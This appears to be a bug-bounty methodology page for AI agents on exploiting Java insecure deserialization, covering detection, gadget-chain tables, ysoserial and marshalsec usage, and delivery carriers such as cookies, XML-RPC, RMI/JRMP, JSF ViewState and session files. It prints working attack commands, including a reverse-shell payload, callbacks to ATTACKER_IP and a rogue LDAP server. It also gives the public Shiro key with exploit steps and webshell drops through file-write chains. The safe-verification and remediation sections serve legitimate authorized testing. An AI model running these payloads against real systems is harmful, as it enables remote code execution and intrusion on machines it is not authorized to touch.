---
technology: "Java insecure deserialization (native serialization + gadget-chain ecosystem)"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.2
last-refresh: "2026-11-19"
source: "corpus-mined + upstream-verified (see provenance on the companion overview page)"
provenance: "corpus-mined from 9 writeups in the writeup corpus + upstream-verified against frohoff/ysoserial README/source, Apache Commons Collections security page, Red Hat CVE-2015-7501 record, and Apache OFBiz advisories (CVE-2020-9496, CVE-2023-49070, CVE-2023-51467). Pass 2 final unit, 2026-11-13. Supplement 2026-11-19 (gadget-chain selection craft): full ysoserial dependency matrix, modern-JDK encapsulation gating, Java-service fingerprint/port map, product-CVE table (WebLogic/JBoss/Jenkins/ActiveMQ/Shiro), blind-deser ladder, gadget-discovery tooling, CTF notes — re-verified against frohoff/ysoserial README, ZDI/OWASP/Praetorian/CodeWhite analyses, and primary CVE records (claude-opus-4-8)."
---

# Java deserialization — bug bounty methodology

Companion overview: [[java-deserialization|Java deserialization overview]]. Neighbor units: [[java-rmi]] (RMI/JRMP/JMX carriers and listeners), [[log4j]] (JNDI injection whose modern payload path is a serialized gadget served over LDAP). A jackson-databind unit was proposed and gate-failed; the surviving native-serialization cluster is this unit (`internal-coverage/pass2-report.md`).

**Scope**: JVM serialization only. .NET deserialization — ysoserial.net gadgets (`TypeConfuseDelegate`, `ObjectDataProvider`, `WindowsIdentity`, `TextFormattingRunProperties`), `BinaryFormatter` sinks, ASP.NET `__VIEWSTATE` + `machineKey` forgery — is a different runtime, toolchain and fingerprint set, and is deliberately out of scope.

## Phase 1 — Find the sink (detection)

The sink is an `ObjectInputStream.readObject()` fed network bytes. Confirm with fingerprints before touching gadgets.

### 1.1 Stream fingerprints

| Where | What you see |
|---|---|
| Raw bytes | body/file starts `AC ED 00 05`; `file blob` reports "Java serialization data, version 5"; `xxd` shows `aced 0005` then `7372` (`sr` = object + class name follows) |
| Base64 | any param, cookie, header or XML text node starting `rO0AB` (that is `AC ED 00 05` base64'd — `printf '\xac\xed\x00\x05' \| base64` → `rO0ABQ==`) |
| Hex dumps / DB columns | `aced00057372...` then UTF class names in the ASCII column |
| Declared | `Content-Type: application/x-java-serialized-object` on any endpoint |

Grep proxy traffic for all three forms (`rO0AB`, `aced0005`, raw magic) — old tickets, remember-me cookies and internal RPC shows up in passive captures as often as in live params.

### 1.2 Surface folklore (where streams hide)

- Long opaque base64 in `viewstate`/`session`/`token`/`data`/`s` parameters — swap-and-decode to check.
- `javax.faces.ViewState` hidden fields on JSF pages (Phase 4.4).
- XML-RPC bodies containing `<serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">` (Phase 4.5).
- `application/octet-stream` blob endpoints with no documented format.
- Binary fat clients: decompile (CFR/jd-gui/jadx) and grep for `ObjectInputStream`, `readObject`, `implements Serializable` — the server half of the client's contract is the sink.
- Serialized blobs parked in database columns and cache files, deserialized by background jobs — magic bytes in anything the app persists.

### 1.3 Error oracle (gadget-free sink confirmation)

POST garbage in the expected encoding and diff responses:

- `ClassNotFoundException: <your-marker-class>` — deserialization confirmed; encode a recognizable marker name in the tampered stream so the error names it back.
- `InvalidClassException` / serialVersionUID talk — sink confirmed AND a JDK/compile-time mismatch signal (Phase 3.2).
- `stream corrupted` / unexpected `EOF` — a parser read your bytes; ambiguous, probe further.
- Stack trace naming `java.io.ObjectInputStream` — confirmed.
- Identical responses everywhere — go OOB (URLDNS canary, Phase 5.1) instead of trusting response diffing.

Decision: sink confirmed + attacker-controlled bytes → Phase 2. Sink gated on a key/secret (encrypted ViewState, encrypted cookie) → key-hunt first (Phase 4.4).

### 1.4 Reading the stream

When you can capture or exfiltrate a sample stream, decode it before attacking: a serialization-dumper-style tool (or manual `xxd` walk) turns `aced0005` into class names, field names and values. Sample streams reveal (a) the application's own serializable classes — candidates for app-owned gadgets, (b) whether values are encrypted vs plaintext inside the stream, and (c) `serialVersionUID`s you must match when forging.

## Phase 2 — Inventory the classpath (gadget selection)

Gadget choice is a compatibility lookup, not guesswork.

### 2.1 Sources of classpath intel, best first

1. **Any file-read primitive**: `/WEB-INF/web.xml`, `pom.xml`, `build.gradle`, `lib/` and `WEB-INF/lib/` directory listings, `META-INF` of shaded JARs — exact artifact versions decide the chain.
2. **On-box access**: `ls` the application lib directory; `unzip -l app.jar | grep -Ei 'commons-(collections|beanutils)'`; `/proc/<pid>` maps and root-dir hints; a container image of the same stack.
3. **Product identity**: framework versions imply library sets (OFBiz ships the commons stack; minimal Spring services may ship none of it — JRE-only chains then).

### 2.2 Gadget compatibility table (upstream: ysoserial payload documentation)

| Chain | Needs on classpath | Entry mechanics | JDK notes |
|---|---|---|---|
| CommonsCollections1 | commons-collections 3.x | `AnnotationInvocationHandler` proxy → `LazyMap.get` → transformer chain → `Runtime.exec` | `AnnotationInvocationHandler.readObject` internals changed in JDK 8u71 — legacy-JDK chain |
| CommonsCollections3 | commons-collections 3.x | CC1 entry, ends `InstantiateTransformer` → `TrAXFilter` → `TemplatesImpl` | same 8u71 constraint; bytecode route |
| CommonsCollections2 | commons-collections4 4.x | `PriorityQueue` + `TransformingComparator` → `InvokerTransformer` → `TemplatesImpl` | modern-JDK friendly; cc4 specifically |
| CommonsCollections4 | commons-collections4 4.x | CC2 entry with `InstantiateTransformer` variant | same |
| CommonsCollections5 | commons-collections 3.x | `BadAttributeValueExpException.readObject` → `TiedMapEntry.toString()` → `LazyMap.get` | ysoserial source: JDK 8u76+ AND no SecurityManager — the workhorse on modern JDK 8 |
| CommonsCollections6 | commons-collections 3.x | `HashSet`/`HashMap` hash → `TiedMapEntry.toString()` → `LazyMap.get` | broadest JDK reach, no SecurityManager dependency |
| CommonsCollections7 | commons-collections 3.x | `Hashtable` key equality/hash → `LazyMap` | alternate entry when CC6 shapes are filtered |
| CommonsBeanutils1 | commons-beanutils (+ commons-collections) | `BeanComparator` + `PriorityQueue` → `TemplatesImpl` | often present where commons-collections was upgraded |
| Jdk7u21 | JRE only — no library | `LinkedHashSet`/proxy type-confusion against old annotation internals | old-JDK-7 family exactly; zero-dependency when it fits |
| Myfaces1 / Myfaces2 | Apache MyFaces | ViewState-oriented chains | the JSF case, Phase 4.4 |
| URLDNS | nothing (pure JRE) | `URL.hashCode()` triggers DNS lookup | **the canary** — never executes code; use first, always |
| JRMPClient / JRMPListener | JRE | make the target connect out to / bind another JRMP sink | pairs with [[java-rmi]] |

### 2.3 Hardening gates (verify before declaring a chain dead)

- **commons-collections 3.2.2 / 4.1 functor hardening** (Apache COLLECTIONS-580, the CVE-2015-7501 lineage): 3.2.2 makes unsafe functor deserialization throw `UnsupportedOperationException` unless `-Dorg.apache.commons.collections.enableUnsafeSerialization=true`; 4.1 drops `Serializable` from the unsafe functors outright. Against these, pivot to CommonsBeanutils1 or JRE chains.
- **JEP-290 `ObjectInputFilter` / SerialKiller / look-ahead proxies**: class-name filters kill known chains. Distinguish filter-rejection (error names a blocked class) from class-missing (`ClassNotFoundException`) — the former means the sink is real and someone knew; try alternate entries (CC7 when CC6 is named, CB1, app-owned gadgets) or settle for a sink-only finding.
- **SecurityManager**: CC5 and several entries require its absence; CC6 does not.

### 2.4 TemplatesImpl end-gadget mechanics

`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` (a JRE class) defines a class from its own serialized `_bytecodes` field when `newTransformer()` runs — `defineClass` on attacker bytes, static initializer executes. Constraints when hand-building: the bytecode class must extend `AbstractTranslet`, `_name` must be non-null, `_tfactory` must be set. This end gadget is why CC2/CC4/CB1 reach arbitrary bytecode rather than one `Runtime.exec` string, and why `com.sun.org.apache.xalan...TemplatesImpl` shows up inside serialized stream dumps of those chains.

### 2.5 App-owned gadget chains

With any source access (decompiled client, leaked `/backups/*.java`, config repos), audit the application's own `Serializable` classes for `readObject` implementations with side effects: a custom `readObject` that builds a shell command, file path, class name, or lookup from object fields is a gadget no library version gates and no filter anticipates. Craft the object directly with a small Java program compiled against the target's classes instead of a stock chain.

## Phase 3 — Generate and stage the payload

### 3.1 Commands

```
# canary first (DNS-only, no code execution, zero dependencies):
java -jar ysoserial.jar URLDNS "http://canary-<marker>.example.com" > url.ser

# command canary (OOB ping to your box):
java -jar ysoserial.jar CommonsCollections6 'ping -c 3 ATTACKER_IP' > ping.ser

# shell (Linux, quoting-tolerant brace form):
java -jar ysoserial.jar CommonsCollections5 \
  "bash -c {echo,<base64 of reverse shell>}|{base64,-d}|{bash,-i}" > shell.ser

# encodings per carrier:
base64 -w0 ping.ser            # params / cookies / XML text nodes
xxd -p ping.ser | tr -d '\n'   # hex, for some DB / protocol carriers
```

### 3.2 Staging rules

- **Match the target's JDK family** when generating — stream and `serialVersionUID` compatibility and gadget behavior differ across releases. If the exact stack is known, build the payload inside a container replicating it (same JVM version as the target) and move the `.ser` out; the container also settles brace-form quoting against the right `/bin/sh`.
- **Iterate chains empirically** in this order: CC6 → CC5 → CommonsBeanutils1 → CC2/CC4 (only if cc4 present) → Jdk7u21 (old JDK) → app-owned. A silent non-fire tells you as much as an error: wrong library vs filtered class vs wrong carrier.
- **Expect "error response but it worked"**: many sinks answer 500 while the gadget already ran — always have the OOB listener up before firing; never judge by the HTTP response alone.
- Multi-stage delivery (fetch script → chmod → execute as separate serialized requests) beats one-shot quoting fights on strict parsers.

## Phase 4 — Delivery vectors (carrier recipes)

### 4.1 Plain HTTP / binary clients

Replace the request body with raw bytes (`Content-Type: application/x-java-serialized-object` where the endpoint declares it) or base64 where the protocol wraps it. For fat clients, patch the client's serialization call to emit your `.ser` and re-sign/encode as the client does.

### 4.2 Cookies

Session / remember-me cookies carrying `rO0AB...`: swap the value. If the cookie is encrypted or MACed, find the key first (app source, config-read primitive, decompiled client) — the deserializer is behind the unwrap, and a tampered ciphertext usually answers with padding/MAC errors that confirm the layering.

### 4.3 RMI / JRMP

Point the target at your listener:

```
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 'ping ATTACKER_IP'
```

for endpoints that connect out when resolving a reference (RMI registries, JMX, Spring `jndiUrl` gadgets). Recon of those endpoints is [[java-rmi]]'s job.

### 4.4 JSF / MyFaces ViewState (the Java flavor)

1. Confirm JSF: hidden input `id="javax.faces.ViewState"`; `javax.faces.STATE_SAVING_METHOD=server` yields short server-side handles, client-side saving yields large base64 blobs — both can be attackable, the key situation differs.
2. Hunt the keys in `web.xml` context parameters: `org.apache.myfaces.SECRET` (encryption), `org.apache.myfaces.MAC_SECRET` and `org.apache.myfaces.MAC_ALGORITHM` (e.g. `HmacSHA1`). Usual sources: `web.xml` backups (`.bak` siblings), any file-read primitive, source repos. Unencrypted+unsigned ViewStates take the payload raw.
3. Build: ysoserial payload (`CommonsCollections*`) → encrypt with SECRET → HMAC with MAC_SECRET → base64 → POST as `javax.faces.ViewState` of the same page and flow (JSF checks the view id).
4. The .NET sibling — `__VIEWSTATE` + `__VIEWSTATEGENERATOR` + `machineKey`/`ViewStateUserKey` — is out of scope (scope note above).

### 4.5 XML-RPC (OFBiz pattern)

```
POST /webtools/control/xmlrpc HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<methodCall><methodName>ping</methodName><params><param><value><struct>
  <member><name>x</name><value>
    <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">BASE64_PAYLOAD</serializable>
  </value></member></struct></value></param></params></methodCall>
```

Advisory chain (upstream-verified, Apache OFBiz): CVE-2020-9496 (unsafe XML-RPC deserialization, OFBiz 17.12.03 affected, fixed 17.12.04, OFBIZ-11716) → CVE-2023-49070 (pre-auth RCE, everything before 18.12.10, OFBIZ-12812 — the deprecated XML-RPC code path remained reachable) → CVE-2023-51467 (authentication bypass left by the partial fix, before 18.12.11, OFBIZ-12873). Version banners on the OFBiz login page map directly onto this chain. Errors on the HTTP layer do not mean the gadget failed — stage an OOB canary alongside.

### 4.6 XML unmarshalling (Castor / Hessian family)

For endpoints that unmarshal attacker XML into live objects, marshalsec wraps gadgets for a dozen unmarshallers:

```
java -cp marshalsec.jar marshalsec.Castor        # also: Hessian, Hessian2, and friends
# gadget list prints; SpringAbstractBeanFactoryPointcutAdvisor wants a jndiUrl ->
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://198.51.100.10:8080/#Exploit 1389
```

(upstream usage: `marshalsec.jndi.(LDAP|RMI)RefServer <codebase>#<class> [<port>]`; the `jndiUrl` you feed the gadget is `ldap://ATTACKER_IP:1389/obj`.) Select the gadget from the target's `pom.xml` dependency list; the reference server or a ysoserial JRMP listener on ATTACKER_IP serves the other half. The marshalsec LDAP/JRMP side overlaps [[log4j]] and [[java-rmi]] tooling — same servers, different entry bug.

### 4.7 Database and queue columns

JDBC drivers and custom clients deserialize values a server hands them: stand up a rogue MySQL-style listener on ATTACKER_IP that answers the client's handshake and returns the payload bytes (hex-encoded `.ser`) as a result-set value; redirect the client via a config write or a poisoned connection string. Serialized blobs stored in DB tables get picked up by scheduled jobs — write, then wait (and say so in the report's timing section).

### 4.8 Session persistence / drop directories

Servlet containers that persist sessions to disk (`*.session` files) reload them with `readObject`. A file-write primitive plus a ysoserial payload written as a session file yields execution at the next session load — delayed but reliable, and invisible in HTTP logs. Cache directories and spool folders behave the same.

### 4.9 JNDI javaSerializedObject (the modern JNDI endgame)

Modern JDKs block remote codebases from LDAP/RMI URLs (`trustURLCodebase=false`), so a rogue directory answers with a **serialized object** (`javaSerializedObject` attribute) that detonates in the client's `readObject` — JNDI-Exploit-Kit-style tooling exposes this as a `/serial/<chain>/<command>` URL path. Any JNDI injection you can steer (log4j-style lookups being the mass case, see [[log4j]]) ends in exactly this unit's gadget table: the entry bug and the payload bug are separate findings joined by LDAP.

## Phase 5 — Safe verification and disclosure

### 5.1 The canary ladder

1. **URLDNS** — DNS-only, no code execution, zero gadget dependencies; a hit proves the sink, nothing more.
2. **OOB command canary** — `ping -c 3 ATTACKER_IP` or an HTTP fetch to `http://ATTACKER_IP/<marker>` with `tcpdump -i any icmp` / `nc -lvnp` running: proves command execution. Capture the ICMP echo / HTTP request as the evidence artifact.
3. **Interactive session** — only after 1–2, only what the report needs.

Use an interactsh/Burp Collaborator-style interaction endpoint or your own wildcard domain; embed unique markers per parameter so callbacks identify the sink.

### 5.2 Never fire destructive PoCs

No deletion, forking, service kills or resource exhaustion as a "proof". A DNS callback plus one `id`-equivalent is a complete impact statement; anything more is risk without report value.

### 5.3 Failed-fire diagnosis

| Symptom | Meaning | Next |
|---|---|---|
| URLDNS silent | bytes never reach a `readObject` | carrier/encoding wrong — Phase 1 again |
| URLDNS fires, CC6 silent | sink real, gadget classes missing | classpath intel wrong — Phase 2 |
| `InvalidClassException` | serialVersionUID / JDK mismatch | regenerate on matching JDK (container) |
| Filter error naming a class | JEP-290-style deny-list | alternate chain or sink-only finding |
| 500 but no callback | gadget threw mid-chain | try other chains; check command quoting (brace form) |

### 5.4 Reporting

The finding is the **sink** (endpoint + parameter + evidence it deserializes attacker bytes — the error oracle or URLDNS hit). Impact is the demonstrated chain (which library/JRE, which command, captured OOB artifact). Remediation: never deserialize untrusted data — switch to JSON or signed, versioned token formats; where serialization is unavoidable, JEP-290 `ObjectInputFilter` allow-lists on the sink. Library upgrades alone do not close a sink, and deny-list filters are bypassable by new chains — say both.

## Tool map (named in prose; per-tool notes live in the tools vault)

ysoserial (payload generation, JRMP listener); marshalsec (XML/Hessian unmarshaller gadgets, LDAPRefServer); JNDI-Exploit-Kit / rogue-jndi (LDAP serving serialized payloads); Burp Suite Repeater (carrier manipulation); tcpdump + netcat (OOB canary listeners); xxd / base64 / file (magic-byte inspection); serialization-dumper (stream decoding); CFR / jd-gui / jadx (fat-client and shaded-jar decompilation); docker (payload generation under a JDK matching the target).

## Supplement — gadget-chain selection craft (added 2026-11-19)

*Source: external research pass (November 2026), re-verified against the frohoff/ysoserial README (dependency column quoted verbatim), ZDI/OWASP-Stuttgart/Praetorian/CodeWhite write-ups on modern-JDK restrictions, and primary CVE records for the classic products. Extends Phase 2 (gadget selection), Phase 1 (detection), Phase 4 (carriers/sinks), and Phase 5 (verification); nothing above was rewritten. The angle is the one decision that separates a `ClassNotFoundException` from a shell: picking the chain the target's exact classpath and JDK will actually run.*

### S1. The full ysoserial payload matrix (dependencies quoted verbatim)

Phase 2.2 lists the chains you reach for first. This is the complete reference — every stock ysoserial payload, with the dependency string *exactly as the README writes it* (the artifact:version is what must be on the target classpath), the trigger/end-gadget shape, and whether the chain routes through `TemplatesImpl` (which decides its fate on modern JDKs — see S2). Match the version you find in `WEB-INF/lib`/`pom.xml` against the left-hand column.

| Payload | Dependency (verbatim) | Trigger → end gadget | TemplatesImpl? |
|---|---|---|---|
| URLDNS | *(none — pure JRE)* | `HashMap.readObject` → `URL.hashCode()` → DNS | no — **the canary** |
| CommonsCollections1 | `commons-collections:3.1` | `AnnotationInvocationHandler` → `LazyMap` → `InvokerTransformer` → `Runtime.exec` | no (exec string) |
| CommonsCollections2 | `commons-collections4:4.0` | `PriorityQueue` → `TransformingComparator` → `InvokerTransformer` → `TemplatesImpl` | **yes** |
| CommonsCollections3 | `commons-collections:3.1` | CC1 entry → `InstantiateTransformer` → `TrAXFilter` → `TemplatesImpl` | **yes** |
| CommonsCollections4 | `commons-collections4:4.0` | CC2 entry → `InstantiateTransformer` → `TemplatesImpl` | **yes** |
| CommonsCollections5 | `commons-collections:3.1` | `BadAttributeValueExpException` → `TiedMapEntry.toString` → `LazyMap` → exec | no (exec string) |
| CommonsCollections6 | `commons-collections:3.1` | `HashSet`/`TiedMapEntry` hash → `LazyMap` → exec | no — **JDK-broad workhorse** |
| CommonsCollections7 | `commons-collections:3.1` | `Hashtable` key equality → `LazyMap` → exec | no (exec string) |
| CommonsBeanutils1 | `commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2` | `PriorityQueue` → `BeanComparator` → `TemplatesImpl` | **yes** |
| Spring1 | `spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE` | `SerializableTypeWrapper$MethodInvokeTypeProvider` reflective call → `TemplatesImpl` | **yes** |
| Spring2 | `spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2` | JDK AOP proxy → `ObjectFactory` delegation → `TemplatesImpl` | **yes** |
| Groovy1 | `groovy:2.3.9` | `ConvertedClosure`/`MethodClosure` proxy → `entrySet()` → `ProcessGroovyMethods.execute` | no (exec string) |
| Jdk7u21 | *(none — pure JRE)* | `LinkedHashSet` + `TemplatesImpl`/proxy type-confusion against pre-8u20 annotation internals | **yes (built-in)** |
| C3P0 | `c3p0:0.9.5.2, mchange-commons-java:0.2.11` | `PoolBackedDataSource` → JNDI/remote-codebase class load | no (classloading) |
| ROME | `rome:1.0` | `ObjectBean`/`EqualsBean` → `TemplatesImpl` | **yes** |
| BeanShell1 | `bsh:2.0b5` | `Comparator` proxy → BeanShell interpreter → exec | no (interpreter) |
| Clojure | `clojure:1.8.0` | `AbstractTableModel$ff19274a` → Clojure eval | no (interpreter) |
| Jython1 | `jython-standalone:2.5.2` | `PyFunction`/`PyObject` → Python exec (writes a file, then runs) | no (interpreter) |
| MozillaRhino1 | `js:1.7R2` | `NativeJavaObject` → `TemplatesImpl.getOutputProperties()` | yes (getter path) |
| MozillaRhino2 | `js:1.7R2` | shorter Rhino variant → `TemplatesImpl` getter | yes (getter path) |
| JSON1 | `json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1` | json-lib bean population → getter → `TemplatesImpl` | **yes** |
| FileUpload1 | `commons-fileupload:1.3.1, commons-io:2.4` | `DiskFileItem` → arbitrary **file write** (not direct exec) | no (file write) |
| Hibernate1 / Hibernate2 | `hibernate-core` (README cell blank; needs Hibernate on path) | `TypedValue`/`ComponentType` getter chain → `TemplatesImpl` | **yes** |
| Myfaces1 / Myfaces2 | *(README cell blank; MyFaces + EL)* | JSF ViewState → EL evaluation / `TemplatesImpl` | mixed — see 4.4 |
| JRMPClient | *(none — JRE)* | makes the target **connect out** to your JRMP sink | n/a (carrier) |
| JRMPListener | *(none — JRE)* | binds a JRMP sink that serves a chain to anything that connects | n/a (carrier) |
| JBossInterceptors1 | `javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21` | CDI interceptor proxy → javassist defineClass | yes-like (bytecode) |
| JavassistWeld1 | `javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21` | Weld proxy → javassist defineClass | yes-like (bytecode) |
| Vaadin1 | `vaadin-server:7.7.14, vaadin-shared:7.7.14` | `NestedMethodProperty` getter chain → `TemplatesImpl` | **yes** |
| Wicket1 | `wicket-util:6.23.0, slf4j-api:1.6.4` | `DiskFileItem`-style → file write | no (file write) |
| Click1 | `click-nodeps:2.3.0, javax.servlet-api:3.1.0` | `ColumnComparator` getter chain → `TemplatesImpl` | **yes** |
| AspectJWeaver | `aspectjweaver:1.9.2, commons-collections:3.2.2` | `SimpleCache$StorableCachingMap` → arbitrary **file write** (note: works *with* hardened cc 3.2.2) | no (file write) |

**The rule that saves the most time:** the version label in the README is the version the chain's author *built and tested against*, not a hard floor. A chain marked `commons-collections:3.1` routinely fires against 3.2.1 and other 3.x builds — the gate is the presence of the vulnerable *classes/methods* (`InvokerTransformer`, `LazyMap`), not an exact artifact string. So when CC6 fails on a confirmed `commons-collections` classpath, read ysoserial's chain source and check whether the specific class is present and un-hardened (Phase 2.3) before concluding the library is wrong. Conversely, don't trust the label to *exclude* a chain: `commons-collections4:4.0` chains (CC2/CC4) need the `org.apache.commons.collections4` package specifically — a target with only 3.x will `ClassNotFoundException` on `org.apache.commons.collections4.comparators.TransformingComparator`, a crisp signal you picked the wrong namespace.

### S2. Modern-JDK reality — why half that table is dead on JDK 16+

Strong encapsulation (JEP 396/403, default from **JDK 16**, enforced in 17 LTS) is the single biggest reason a "correct" chain fails today. Any chain whose end gadget is `TemplatesImpl` (the **TemplatesImpl? = yes** rows above) performs reflection into `com.sun.org.apache.xalan.internal.xsltc.trax` inside the `java.xml` module, which no longer exports that package to unnamed modules. The symptom is unmistakable:

```
java.lang.IllegalAccessError: class ... cannot access class
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl (in module java.xml)
because module java.xml does not export ... to unnamed module
```

Reproduced publicly on JDK 16/17 while JDK 11/15 run the same payload fine (Praetorian found CommonsBeanutils1 dead by default on 17; a Burp forum thread pins the boundary at 16). **Decision tree when the target is JDK 16+:**

- **Prefer exec-string chains** that never touch `TemplatesImpl`: CommonsCollections6/5/7, CommonsCollections1, Groovy1, BeanShell1, Clojure, Jython1. These end in `Runtime.exec` or a script interpreter and are unaffected by `java.xml` encapsulation. CC6 remains the first thing to try on a modern JDK 8–21 target with commons-collections 3.x present.
- **Getter-path Rhino** (MozillaRhino1/2 call `TemplatesImpl.getOutputProperties()` rather than reflecting into private fields) and the community **Rhino3** PR are reported working on JDK 17 — but Rhino `1.7.14`/`1.7.15` broke the chain, so the *Rhino* version matters as much as the JDK.
- **File-write chains** (FileUpload1, Wicket1, AspectJWeaver) sidestep both encapsulation and exec filtering — they drop a file (a JSP into a webroot, a cron entry, an SSH key). Two serialized requests: write the webshell, then request it.
- **ysoserial is unmaintained since 2021.** Its rigid one-shot generation is exactly what strong encapsulation breaks. The NordSec-2025 *GadgetBuilder* work re-floats ~17 of the original chains on JDK 16+ by splitting each into fragments that evade encapsulation; if the stock jar fails only with `IllegalAccessError` (not `ClassNotFoundException`), the classpath is right and a fragment-rebuilt chain or a `--add-opens`-independent path is the move, not a different library.

Do **not** read `IllegalAccessError` as "chain wrong." It means the opposite: the gadget classes loaded and ran right up to the reflective step — you are one JDK-compatibility rebuild away, not back at Phase 2.

### S3. Java-service fingerprints — ports, banners, headers (detection before exploitation)

Phase 1 covers stream magic in HTTP. The other half of detection is recognizing a Java service by its listener before you ever see a stream. Scan/triage against this map:

| Port(s) | Service | Tell / banner | Deser relevance |
|---|---|---|---|
| 7001, 7002 | Oracle WebLogic (T3/T3s) | send `t3 12.2.1\nAS:255\nHL:19\n\n` → reply leaks `HELO:<version>` | T3 is a serialization protocol; CVE table S4 |
| 1099 (and ephemeral) | Java RMI registry / JMX | JRMP magic `4a 52 4d 49` (`JRMI`) on connect | registry lookups deserialize; pair with [[java-rmi]] |
| 1098, 4444, 4445, 8083 | JBoss naming / JRMP / web | `/invoker/JMXInvokerServlet`, `/invoker/EJBInvokerServlet` | CVE-2015-7501 |
| 8080 + CLI port header | Jenkins | `X-Jenkins:` version header; `X-Jenkins-CLI-Port` / `X-Jenkins-CLI2-Port` announce the remoting port | CLI remoting deserializes (CVE-2015-8103) |
| 61616 (OpenWire), 8161 (web) | Apache ActiveMQ | OpenWire binary handshake; web console `Server: Jetty` + ActiveMQ title | JMS `ObjectMessage` (CVE-2015-5254) |
| 8009 | AJP (Tomcat) | AJP13 | not deser itself, but fronts session stores |
| 6379 / 11211 | Redis / memcached | `PING`→`+PONG` / `stats` text protocol | session-serializer sinks (S4) |
| 5005, 8000 | JDWP | `JDWP-Handshake` | not deser — direct RCE if exposed; note alongside |
| any | declared Java stream | `Content-Type: application/x-java-serialized-object`; `Accept:` the same | explicit sink |

Headers worth grepping across all captured HTTP: `Set-Cookie: rememberMe=` (Apache Shiro — S4), `X-Powered-By` naming a Java app server, and any cookie/param whose base64 starts `rO0AB` (Phase 1.1). **GadgetProbe** (Bishop Fox, a Burp extension) turns detection quantitative: it serializes a `DNSURL`-style object referencing one class name at a time and watches for the DNS callback, enumerating *exactly which library classes exist on the remote classpath* before you commit to a chain — classpath intel (Phase 2.1) obtained remotely when you have no file-read. Run it against a confirmed URLDNS sink to map `commons-collections`, `commons-beanutils`, `spring`, `groovy` presence, then pick the chain S1 says those versions run.

### S4. Where the sinks live — product/protocol sink map and the classic-product CVEs

Beyond the carriers in Phase 4, these are the recurring real-world sink locations:

- **HTTP session persistence / clustering.** Containers that replicate or persist sessions (Tomcat `PersistentManager`/`DeltaManager`, and crucially **third-party session stores**) call `readObject` on stored session attributes. Tomcat-redis-session-manager and memcached-session-manager (`msm`) serialize session objects into Redis/memcached; an exposed, writable Redis (6379, no auth) or memcached (11211) lets you plant a gadget as a session value that detonates when the container reloads that session. Spring Session with the JDK serializer behaves identically. This is delayed and invisible in HTTP logs (see 4.8) — state it in the report's timing section.
- **RMI / JMX on 1099.** Registry `bind`/`lookup` and JMX-over-RMI deserialize attacker objects; `JRMPListener`/`JRMPClient` (S1) and ysoserial's `RMIRegistryExploit` / `JRMPListener` exploit classes are the tooling. Recon is [[java-rmi]]'s job.
- **JMS queues.** A JMS `ObjectMessage` *is* a serialized Java object; any consumer that calls `getObject()` without a class allowlist is a sink. The **jmet** (Java Message Exploitation Tool) tool wraps ysoserial payloads into ObjectMessages for ActiveMQ and friends — CVE-2015-5254.
- **Custom binary protocols / fat-client back-ends.** The server half of a thick client's wire contract (Phase 1.2) is a sink whenever it `readObject`s frames. Decompile the client, find the serialization call, replay a crafted frame.
- **Caches and drop directories.** Serialized blobs in DB columns, Ehcache disk stores, and spool folders deserialized by background jobs (4.7–4.8).

**Classic-product CVE map** (verify the banner/version from S3, then map here — all unauthenticated RCE unless noted):

| Product | CVE | Vector | Chain / note |
|---|---|---|---|
| Oracle WebLogic | CVE-2015-4852 | T3 (7001) | commons-collections; Oracle's first fix was a package **blacklist** |
| Oracle WebLogic | CVE-2018-2628 | T3 (7001) | blacklist bypass; CVSS 9.8 |
| Oracle WebLogic | CVE-2020-2555 | T3/Coherence | `LimitFilter`→`ChainedExtractor.extract`; a patch-bypass in the Coherence gadget lineage (ZDI) |
| Oracle WebLogic | CVE-2020-2883 | T3/IIOP | `PriorityQueue`+`ExtractorComparator` (Coherence); 9.8; CISA KEV |
| Red Hat JBoss AS 4–6 | CVE-2015-7501 | `/invoker/JMXInvokerServlet`, `/invoker/EJBInvokerServlet` | commons-collections; EAP 7 removed the servlets |
| Jenkins | CVE-2015-8103 | CLI remoting port (S3 header) | commons-collections (S. Breen); blacklist added after |
| Jenkins | CVE-2016-0788 | remoting | blacklist bypass (M. Bechler) |
| Apache ActiveMQ < 5.13.0 | CVE-2015-5254 | JMS `ObjectMessage` (61616) | no class allowlist; exploit with **jmet** |
| Apache Shiro < 1.2.5 | CVE-2016-4437 | `rememberMe` cookie | AES-128-CBC with a **hardcoded, public** key (`kPH+bIxk5D2deZiIxcaaaA==`); encrypt a ysoserial payload under the key, send as `rememberMe` (4.2); CISA KEV |
| Apache OFBiz | CVE-2020-9496 / CVE-2023-49070 / CVE-2023-51467 | XML-RPC (4.5) | covered in Phase 4.5 |

The Shiro case is the cleanest bounty/CTF pattern of all: fingerprint is the `rememberMe=deleteMe` response cookie; the key is public; the only variable left is which chain the classpath runs (S1) — so it is a pure gadget-selection exercise once the key is known. Where a deployment set a custom key, it degrades to a padding-oracle / key-hunt problem (4.2) instead.

### S4.1 Worked flows (command → expected output)

**WebLogic T3 version fingerprint, then URLDNS over T3.** Confirm the listener and version before any gadget:

```
# 1. version banner — raw T3 handshake
printf 't3 12.2.1\nAS:255\nHL:19\n\n' | nc -w3 198.51.100.10 7001
# -> HELO:12.2.1.3.0.false  AS:2048  HL:19 ...   (version string = your CVE lookup key, S4)

# 2. safe canary first — URLDNS carried in a T3 payload (tooling wraps the framing)
#    with: dnslog/collaborator armed, tcpdump not needed (DNS only)
java -jar ysoserial.jar URLDNS "http://t3-canary-7001.example.com" > t3-url.ser
